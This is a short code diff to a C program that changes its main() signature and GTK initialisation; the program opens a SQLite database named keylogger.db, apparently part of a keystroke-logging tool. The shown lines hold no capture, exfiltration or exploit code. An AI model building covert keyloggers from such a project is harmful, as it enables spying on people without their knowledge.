@@ -159,9 +159,10 @@ void sigint_handler(int sig) {
   _exit(sig);
 }
 
-int main(int argc, char **argv) {
+int main () { //(int argc, char **argv) {
   sqlite3 *keylogger;
-  gtk_init(&argc, &argv);
+  //gtk_init(&argc, &argv);
+  gtk_init(0, NULL);
   mainWindow();
   int res= sqlite3_open("../database/keylogger.db", &keylogger);
   if(res) {
